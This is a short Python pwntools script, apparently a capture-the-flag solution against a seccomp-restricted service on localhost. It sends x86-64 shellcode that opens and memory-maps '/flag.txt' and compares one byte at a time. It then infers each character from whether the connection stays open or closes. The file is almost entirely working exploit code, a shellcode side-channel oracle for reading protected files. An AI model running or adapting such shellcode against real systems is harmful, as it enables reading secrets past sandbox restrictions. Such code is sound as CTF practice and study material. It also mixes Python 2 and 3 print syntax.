from pwn import *

context.arch = 'amd64'
context.log_level = 'CRITICAL'

offset = 200

flag = ''

for i in range(100):
    for j in range(0x20,0x80):
        print("trying {}...{}".format(flag, chr(j)))
        _asm = '''
        /* call openat(AT_FDCWD, '/flag.txt', 'O_RDONLY', 0) */
        mov rsi, rax
        add rsi, %d
        mov rax, 257
        mov rdi, -100
        xor rdx, rdx
        xor rcx, rcx
        syscall

        /* call mmap(0, 4096, 'PROT_READ', 'MAP_PRIVATE', 'rax', 0) */
        push MAP_SHARED /* 1 */
        pop r10
        mov r8, rax
        xor r9d, r9d /* 0 */
        push SYS_mmap /* 9 */
        pop rax
        xor edi, edi /* 0 */
        push PROT_READ /* 1 */
        pop rdx
        mov esi, 0x1000 /* 4096 */
        syscall

        mov dl, byte ptr [rax+%d]
        cmp dl, %d
        jnz not_match

        /* read(0, mmap, 100) */
        mov rsi, rax
        xor rdi, rdi
        xor rax, rax
        mov rdx, 100
        syscall

        not_match:
        /* exit(0) */
        xor rdi, rdi
        mov rax, 60
        syscall
        ''' % (offset, i, j)
        sc = asm(_asm)
        sc = sc.ljust(offset,'\x90')+'/flag.txt\x00'

        # p = process(["./seccomp2"])
        p = remote("localhost", 10103)
        p.sendline(sc)
        try:
            p.recv(timeout=1)
            flag += chr(j)
            p.close()
            break
        except EOFError:
            pass
        p.close()
        if j==0x7f:
            print flag
            exit()